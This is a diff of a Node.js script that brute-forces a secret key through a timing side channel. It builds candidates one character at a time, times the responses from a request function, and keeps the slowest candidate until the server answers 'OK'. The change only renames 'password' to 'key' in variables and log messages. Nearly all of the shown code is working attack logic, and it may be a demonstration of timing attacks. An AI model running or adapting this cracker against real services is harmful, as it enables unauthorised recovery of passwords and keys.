@@ -9,20 +9,20 @@ const ALLOWED_CHARS = (L_ALPHA + U_ALPHA + NUM).split('');
 const OBSERVATIONS_PER_CHAR = 20;
 
 if (!process.argv[2]) {
-  throw new Error('Provide password length');
+  throw new Error('Provide key length');
 }
 
-const pwdLen = Number.parseInt(process.argv[2]);
+const keyLen = Number.parseInt(process.argv[2]);
 
-let pwd = '';
+let key = '';
 
 async function guessNextCharacter() {
   /** @type string[] */
-  const candidates = ALLOWED_CHARS.map(c => pwd + c);
+  const candidates = ALLOWED_CHARS.map(c => key + c);
 
-  if (candidates[0].length > pwdLen) {
-    console.log('Maximum length reached, but password was not found. Resetting...');
-    pwd = '';
+  if (candidates[0].length > keyLen) {
+    console.log('Maximum length reached, but key was not found. Resetting...');
+    key = '';
     setTimeout(guessNextCharacter, 0);
     return;
   }
@@ -35,9 +35,9 @@ async function guessNextCharacter() {
 
   for (let i = 0; i < OBSERVATIONS_PER_CHAR; i++) {
     for (const candidate of candidates) {
-      const [res, timeDiff] = await makeRequest(candidate.padEnd(pwdLen, '0'));
+      const [res, timeDiff] = await makeRequest(candidate.padEnd(keyLen, '0'));
       if (res === 'OK') {
-        console.log('PASSWORD CRACKED: ' + candidate);
+        console.log('KEY CRACKED: ' + candidate);
         return;
       }
       observations[candidate].push(timeDiff);
@@ -46,8 +46,8 @@ async function guessNextCharacter() {
   const sorted = candidates
     .map(c => [c, midsummary(observations[c])])
     .sort((a, b) => b[1] - a[1]);
-  pwd = sorted[0][0];
-  console.log(pwd);
+  key = sorted[0][0];
+  console.log(key);
 
   setTimeout(guessNextCharacter, 0);
 }
